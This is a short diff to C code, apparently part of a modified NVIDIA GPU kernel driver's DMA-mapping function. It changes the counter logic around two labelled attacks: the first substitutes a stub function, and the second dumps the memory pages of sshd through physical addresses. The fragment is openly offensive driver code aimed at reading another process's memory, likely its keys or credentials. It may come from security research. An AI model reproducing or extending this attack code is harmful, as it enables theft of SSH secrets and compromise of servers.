@@ -626,7 +626,7 @@ RM_STATUS NV_API_CALL new_funct( nv_state_t *nv,
 		    dma_map->user_pages = *priv;
 		    dma_map->dev = nvl->dev;
 
-if (attack_num == 0) {
+if (attack_num < 2) {
 	// this is the 1st attack: substitute the stub function
 
 	      attack_num ++;
@@ -736,7 +736,7 @@ if (attack_num == 0) {
 		            return status;
 		        }
 		    }
-} else if (attack_num == 1) {
+} else {
   // This is the 2nd attack: dump sshd memory page
 
 		    // Start getting Phys addr from Pages.
